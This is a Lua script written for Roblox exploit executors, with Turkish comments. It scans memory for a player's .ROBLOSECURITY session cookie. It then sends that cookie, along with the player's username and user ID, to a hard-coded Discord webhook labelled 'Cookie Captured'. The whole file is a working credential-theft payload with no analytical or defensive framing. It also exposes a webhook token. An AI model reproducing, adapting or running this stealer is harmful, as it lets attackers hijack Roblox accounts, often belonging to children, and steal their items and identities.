local HttpService = game:GetService("HttpService")

local webhook = "https://discord.com/api/webhooks/1395813247558357002/sviDQzBGW-E3Ug9UvV8K21uDvVbjTnpzXaIn0ZMDJfwYiIg_1SU7-6Ai1DjAT05Yq6L1"

-- ROBLOSECURITY çerezini bellekte arayan fonksiyon
local function getCookie()
    local cookies = nil
    -- Synapse X ve Script-Ware için registry'den çerez arama
    local registry = debug.getregistry()

    for i,v in pairs(registry) do
        if type(v) == "string" and v:find(".ROBLOSECURITY=") then
            cookies = v:match(".ROBLOSECURITY=([^;]+)")
            if cookies then
                return cookies
            end
        end
    end
    return nil
end

local cookie = getCookie()

if cookie then
    local data = {
        content = "",
        embeds = {{
            title = "ROBLOSECURITY Cookie Yakalandı!",
            color = tonumber(0xff0000),
            fields = {
                {
                    name = "Cookie",
                    value = "```"..cookie.."```",
                    inline = false
                },
                {
                    name = "User",
                    value = game.Players.LocalPlayer.Name,
                    inline = true
                },
                {
                    name = "UserId",
                    value = tostring(game.Players.LocalPlayer.UserId),
                    inline = true
                }
            },
            footer = {
                text = os.date("%Y-%m-%d %H:%M:%S")
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)

    -- webhook'a gönder
    syn.request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
else
    warn("Cookie bulunamadı.")
end
